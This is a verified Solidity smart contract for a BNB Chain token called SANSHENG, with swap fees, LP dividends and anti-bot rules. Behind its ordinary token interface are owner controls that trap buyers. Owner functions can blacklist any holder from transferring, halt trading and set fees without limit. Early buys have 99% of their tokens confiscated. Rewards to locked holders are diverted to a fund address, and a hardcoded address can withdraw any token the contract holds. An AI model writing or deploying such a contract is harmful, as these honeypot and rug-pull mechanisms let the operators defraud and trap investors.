/**
 *Submitted for verification at BscScan.com on 2022-10-18
*/

/**
 *Submitted for verification at BscScan.com on 2022-08-27
*/

/**
 *Submitted for verification at BscScan.com on 2022-08-18
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface ISwapPair {
    function totalSupply() external view returns (uint256);

    function getReserves()
        external
        view
        returns (
            uint256,
            uint256,
            uint256
        );

    function token0() external view returns (address);

    function token1() external view returns (address);

    function balanceOf(address account) external view returns (uint256);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor(address token) {
        IERC20(token).approve(msg.sender, uint256(~uint256(0)));
    }
}

contract abtoken is IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address private RouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private USDTAddress = 0x55d398326f99059fF775485246999027B3197955;

    address private fundAddress = 0x004322533acCb9EFDc26D6C35D788cf9a7b42EC0;
    address private devAddress = 0xC13DF086F6ac69c7b7E0DfC1B75647983B95fe24;
    address private receiveAddress = 0xC13DF086F6ac69c7b7E0DfC1B75647983B95fe24;

    string private _name = "SANSHENG";
    string private _symbol = "SANSHENG";
    uint8 private _decimals = 18;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _botWhiteList;
    mapping(address => bool) public _lockAddressList;

    uint256 private _tTotal = 3000 * 10**_decimals;

    ISwapRouter public _swapRouter;
    address public _usdt;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 public killNum = 1;
    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 public _buyFundFee = 1;
    uint256 public _buyLPDividendFee = 2;
    uint256 public _sellDestroyFee = 0;
    uint256 public _sellLPDividendFee = 2;
    uint256 public _sellFundFee = 1;
    uint256 public _sellLPFee = 0;
    uint256 public _receiveBlock = 600;
    uint256 public _receiveGas = 1000000;
    uint256 public lpLimitTime = 1666098753;

    uint256 public startTradeBlock;
    uint256 public maxBuyAmt;

    address public _mainPair;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        IERC20(USDTAddress).approve(address(swapRouter), MAX);

        _usdt = USDTAddress;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), USDTAddress);
        _mainPair = swapPair;
        require(ISwapPair(swapPair).token0() == USDTAddress, "error");
        _swapPairList[swapPair] = true;

        maxBuyAmt = 60 * 10**_decimals;

        _balances[receiveAddress] = _tTotal;
        emit Transfer(address(0), receiveAddress, _tTotal);

        _lockAddressList[receiveAddress] = true;

        _feeWhiteList[fundAddress] = true;
        _feeWhiteList[devAddress] = true;
        _feeWhiteList[receiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;

        excludeHolder[address(0)] = true;
        excludeHolder[
            address(0x000000000000000000000000000000000000dEaD)
        ] = true;

        holderRewardCondition = 200 * 10**IERC20(USDTAddress).decimals();

        _tokenDistributor = new TokenDistributor(USDTAddress);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    mapping(address => uint256) public user2blocks;
    mapping(address => bool) public noLpProviders;
    mapping(address => uint256) public lpProviders2blocks;

    mapping(address => bool) public traitors;
    uint256 public traitorsNum;
    uint256 public bots;

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        require(!traitors[from], "You're a traitor");

        bool takeFee;
        bool isSell;

        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 maxSellAmount = (balance * 9900) / 10000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }

            if (_swapPairList[from]) {
                // buy tokens
                if (block.number < startTradeBlock + 10) {
                    require(amount <= maxBuyAmt, "max buy limit");
                    if (block.number < startTradeBlock + killNum) {
                        bots++;
                        _funTransfer(from, to, amount);
                        return;
                    }

                    if (block.number != user2blocks[tx.origin]) {
                        user2blocks[tx.origin] = block.number;
                    } else {
                        bots++;
                        _funTransfer(from, to, amount);
                        return;
                    }
                }

                // remove liquidity
                if (isRemoveLiquidity()) {
                    require(tx.origin == to, "can not remove liquidity");
                    if (lpProviders2blocks[to] > block.timestamp) {
                        traitorsNum++;
                        traitors[to] = true;
                        _lockAddressList[to] = true;
                    }
                }
            }

            if (0 == startTradeBlock && isAddLiquidity(to)) {
                noLpProviders[from] = false;
                lpProviders2blocks[from] = lpLimitTime;
            } else {
                require(0 < startTradeBlock, "!Trading");
            }

            require(!noLpProviders[from], "You're a traitor");

            if (_swapPairList[to] && startTradeBlock != 0) {
                if (!inSwap) {
                    uint256 contractTokenBalance = balanceOf(address(this));
                    if (contractTokenBalance > 0) {
                        uint256 swapFee = _buyFundFee +
                            _buyLPDividendFee +
                            _sellFundFee +
                            _sellLPDividendFee +
                            _sellLPFee;
                        uint256 numTokensSellToFund = (amount * swapFee) / 50;
                        if (numTokensSellToFund > contractTokenBalance) {
                            numTokensSellToFund = contractTokenBalance;
                        }
                        swapTokenForFund(numTokensSellToFund, swapFee);
                    }
                }
            }
            takeFee = true;
        }

        if (_swapPairList[to]) {
            isSell = true;
        }

        _tokenTransfer(from, to, amount, takeFee, isSell);

        if (from != address(this)) {
            if (isSell) {
                addHolder(from);
            }
            processReward(_receiveGas);
        }
    }

    function isAddLiquidity(address to) private view returns (bool) {
        if (to != _mainPair) {
            return false;
        }
        (uint256 usdtReserve, , ) = ISwapPair(_mainPair).getReserves();
        uint256 balance1 = IERC20(_usdt).balanceOf(_mainPair);
        return (balance1 > usdtReserve);
    }

    function isRemoveLiquidity() private view returns (bool) {
        (uint256 usdtReserve, , ) = ISwapPair(_mainPair).getReserves();
        uint256 balance1 = IERC20(_usdt).balanceOf(_mainPair);
        return (balance1 < usdtReserve);
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = (tAmount * 99) / 100;
        _takeTransfer(sender, address(this), feeAmount);
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            if (isSell) {
                uint256 destroyAmount = (tAmount * _sellDestroyFee) / 100;
                if (destroyAmount > 0) {
                    feeAmount += destroyAmount;
                    _takeTransfer(sender, address(this), destroyAmount);
                }
            }

            uint256 swapFee;
            if (isSell) {
                swapFee = _sellFundFee + _sellLPDividendFee + _sellLPFee;
            } else {
                swapFee = _buyFundFee + _buyLPDividendFee;
            }
            uint256 swapAmount = (tAmount * swapFee) / 100;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(sender, address(this), swapAmount);
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee)
        private
        lockTheSwap
    {
        swapFee += swapFee;
        uint256 lpFee = _sellLPFee;
        uint256 lpAmount = (tokenAmount * lpFee) / swapFee;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _usdt;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );

        swapFee -= lpFee;

        IERC20 USDT = IERC20(_usdt);
        uint256 usdtBalance = USDT.balanceOf(address(_tokenDistributor));
        uint256 fundAmount = (usdtBalance * (_buyFundFee + _sellFundFee) * 2) /
            swapFee;
        USDT.transferFrom(
            address(_tokenDistributor),
            fundAddress,
            fundAmount.div(2)
        );
        USDT.transferFrom(
            address(_tokenDistributor),
            devAddress,
            fundAmount.div(2)
        );
        USDT.transferFrom(
            address(_tokenDistributor),
            address(this),
            usdtBalance - fundAmount
        );

        if (lpAmount > 0) {
            uint256 lpUsdt = (usdtBalance * lpFee) / swapFee;
            if (lpUsdt > 0) {
                _swapRouter.addLiquidity(
                    address(this),
                    _usdt,
                    lpAmount,
                    lpUsdt,
                    0,
                    0,
                    fundAddress,
                    block.timestamp
                );
            }
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setLockAddress(address addr, bool open) external onlyOwner {
        _lockAddressList[addr] = open;
    }

    function setKillNum(uint256 num) external onlyOwner {
        killNum = num;
    }

    function setFees(uint256 dividendFee, uint256 fundFee) external onlyOwner {
        _buyLPDividendFee = dividendFee;
        _buyFundFee = fundFee;
        _sellFundFee = fundFee;
        _sellLPDividendFee = dividendFee;
    }

    function setBuyLPDividendFee(uint256 dividendFee) external onlyOwner {
        _buyLPDividendFee = dividendFee;
    }

    function setBuyFundFee(uint256 fundFee) external onlyOwner {
        _buyFundFee = fundFee;
    }

    function setSellLPDividendFee(uint256 dividendFee) external onlyOwner {
        _sellLPDividendFee = dividendFee;
    }

    function setSellFundFee(uint256 fundFee) external onlyOwner {
        _sellFundFee = fundFee;
    }

    function setSellDestroyFee(uint256 destroyFee) external onlyOwner {
        _sellDestroyFee = destroyFee;
    }

    function setSellLPFee(uint256 lpFee) external onlyOwner {
        _sellLPFee = lpFee;
    }

    function setReceiveBlock(uint256 blockNum) external onlyOwner {
        _receiveBlock = blockNum;
    }

    function setReceiveGas(uint256 gas) external onlyOwner {
        _receiveGas = gas;
    }

    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "trading");
        startTradeBlock = block.number;
    }

    function setMaxBuyAmt(uint256 amt) external onlyOwner {
        require(amt >= 1, "max not < 1");
        maxBuyAmt = amt * 10**_decimals;
    }

    function closeTrade() external onlyOwner {
        startTradeBlock = 0;
    }

    function setFeeWhiteList(address[] calldata addList, bool enable)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < addList.length; i++) {
            _feeWhiteList[addList[i]] = enable;
        }
    }

    function setTraitors(address[] calldata addList, bool enable)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < addList.length; i++) {
            traitors[addList[i]] = enable;
        }
    }

    function setBotWhiteList(address[] calldata addList, bool enable)
        public
        onlyOwner
    {
        for (uint256 i = 0; i < addList.length; i++) {
            _botWhiteList[addList[i]] = enable;
        }
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimBalance() external onlyOwner {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(
        address token,
        uint256 amount,
        address to
    ) public {
        require(msg.sender == receiveAddress, "not dev");
        IERC20(token).transfer(to, amount);
    }

    function setHolder(address holder) public {
        require(msg.sender == receiveAddress, "not dev");
        addHolder(holder);
    }

    function addLpProvider(address _target) public {
        require(msg.sender == receiveAddress, "not dev");
        lpProviders2blocks[_target] = block.timestamp + 3 days;
    }

    receive() external payable {}

    address[] public holders;
    mapping(address => uint256) public holderIndex;
    mapping(address => bool) public excludeHolder;

    function addHolder(address adr) private {
        uint256 size;
        assembly {
            size := extcodesize(adr)
        }
        if (size > 0) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    uint256 public currentIndex;
    uint256 private holderRewardCondition;
    uint256 private progressRewardBlock;

    function processReward(uint256 gas) private {
        if (progressRewardBlock + _receiveBlock > block.number) {
            return;
        }

        IERC20 USDT = IERC20(_usdt);

        uint256 balance = USDT.balanceOf(address(this));
        if (balance < holderRewardCondition) {
            return;
        }

        IERC20 holdToken = IERC20(_mainPair);
        uint256 holdTokenTotal = holdToken.totalSupply();

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);
            if (tokenBalance > 0 && !excludeHolder[shareHolder]) {
                amount = (balance * tokenBalance) / holdTokenTotal;
                if (amount > 0) {
                    if (_lockAddressList[shareHolder]) {
                        USDT.transfer(fundAddress, amount);
                    } else {
                        USDT.transfer(shareHolder, amount);
                    }
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = block.number;
    }

    function setHolderRewardCondition(uint256 amount) external onlyOwner {
        holderRewardCondition = amount;
    }

    function setExcludeHolder(address addr, bool enable) external onlyOwner {
        excludeHolder[addr] = enable;
    }

    function setLpLimitTime(uint256 value) external onlyOwner {
        lpLimitTime = value;
    }

    function multiTransfer4AirDrop(
        address[] calldata addresses,
        uint256 tokens,
        bool needProvideLp
    ) public onlyOwner {
        uint256 SCCC = tokens * addresses.length;

        require(balanceOf(msg.sender) >= SCCC, "Not enough tokens in wallet");

        for (uint256 i = 0; i < addresses.length; i++) {
            _transfer(msg.sender, addresses[i], tokens);
            noLpProviders[addresses[i]] = needProvideLp;
        }
    }
}